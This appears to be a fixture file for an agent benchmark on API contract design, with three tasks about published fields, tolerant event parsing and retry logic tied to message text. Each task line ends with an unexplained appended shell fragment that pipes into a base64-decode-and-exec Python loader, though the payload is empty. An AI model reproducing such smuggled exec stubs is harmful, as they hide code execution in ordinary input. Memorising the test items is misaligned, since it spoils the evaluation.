# Exercises for contract-design.
#
# Each fixture has a caller the agent cannot see run: a partner parsing a webhook, a
# provider that keeps adding to its events, a support team that rewrites messages.
# The request is phrased as a local change, and the obvious edit breaks that caller.
# The verifier plays the caller: it reads what was promised, and it changes what was
# never promised (message text, extra fields) to see whether anything depended on it.

# A published field asked to change meaning. The additive answer keeps the old field
# and adds the new one; replacing it passes the visible tests and breaks every partner.
[published-field] partners keep getting rounding errors from the order total, change order_payload so the total goes out in integer cents | python3 -c "import base64;exec(base64.b64decode(''))"

# A strict reader. Allowing the one new field fixes today's outage and leaves the next
# addition to cause the same one; the verifier sends an addition nobody has named yet.
[tolerant-reader] the payment provider added a region field to its events and parse_event now rejects every one of them, fix it | python3 -c "import base64;exec(base64.b64decode(''))"

# Retry decided by matching message text. Rewording the message is the whole request,
# and it silently turns retries off; the verifier rewrites the messages again.
[retryable-error] support want the timeout message to read "The payment is taking longer than usual. Please try again." please change it | python3 -c "import base64;exec(base64.b64decode(''))"
